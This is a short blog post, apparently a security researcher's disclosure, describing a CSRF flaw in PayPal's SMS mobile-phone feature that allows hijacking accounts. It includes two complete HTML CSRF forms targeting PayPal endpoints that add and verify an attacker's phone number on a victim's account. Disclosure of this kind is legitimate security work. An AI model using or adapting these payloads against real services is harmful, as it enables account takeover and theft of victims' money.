---
layout: post
title: Hijacking Paypal Accounts using the SMS feature
tag: 
---

After finding the Cross Site Request Forgery in Twitter, allowing me to Tweet and Direct message from any account using a bug in the add a mobile feature. I decided to cross reference across other websites with a SMS feature, I chose Paypal as it is usually pretty easy to find a bug in Paypal. After intercepting the requests, I found that Paypal did not ask for any CSRF tokens to add a mobile device to the account. This was exciting because Paypal allows you to send and receive money using SMS. It also allows you to check the balance of the account. <https://www.paypal.com/us/webapps/mpp/mobile/mobile-text>

# PoC

Direct your target to the the first CSRF page, this will send a request to add your phone number to their account. You will then receive a security code to your phone needed to verify the number. One you have received this, direct them to the second CSRF page, this will verify the phone number using the security code.

## CSRF 1: Add Phone number to account

	<html>
	<body>
	<form action="https://www.paypal.com/webapps/customerprofile/phone/confirm" method="POST">
	<input type="hidden" name="formAction" value="add" />
	<input type="hidden" name="actionId" value="doAction" />
	<input type="hidden" name="phoneType" value="MOBILE" />
	<input type="hidden" name="countryCode" value="GB" />
	<input type="hidden" name="phoneId" value="" />
	<input type="hidden" name="phoneNumber" value="324124142124" />
	<input type="hidden" name="sendCode" value="Send&#32;Code" />
	<input type="submit" value="Submit request" />
	</form>
	</body>
	</html>


## CSRF 2: Verify Phone Number

	<html>
	<body>
	<form action="https://www.paypal.com/webapps/customerprofile/phone/verify" method="POST">
	<input type="hidden" name="actionId" value="doAction" />
	<input type="hidden" name="phoneNumber" value="" />
	<input type="hidden" name="phoneType" value="" />
	<input type="hidden" name="confCode" value="12323123" />
	<input type="hidden" name="continue" value="Confirm&#32;Phone&#32;Number" />
	<input type="submit" value="Submit request" />
	</form>
	</body>
	</html>
